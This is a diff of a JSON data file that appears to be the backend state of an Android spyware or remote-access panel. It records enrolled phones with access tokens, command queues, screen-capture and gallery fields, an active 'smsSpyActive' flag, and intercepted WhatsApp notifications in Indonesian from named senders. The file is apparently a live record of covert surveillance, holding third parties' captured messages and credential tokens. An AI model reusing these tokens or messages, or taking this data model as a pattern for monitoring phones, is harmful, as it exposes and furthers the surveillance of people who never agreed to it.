@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776780670061,
+    "lastSeen": 1776780682001,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Faadil & 2 lainnya",
+        "content": "Telepon suara grup berlangsung",
+        "time": "21/04 21:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780684324
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Faadil & 2 lainnya",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:41",
         "pkg": "com.whatsapp",
         "receivedAt": 1776778889235
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3626 pesan dari 22 chat",
-        "time": "21/04 20:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778889148
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776780671751,
+    "lastSeen": 1776780684212,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
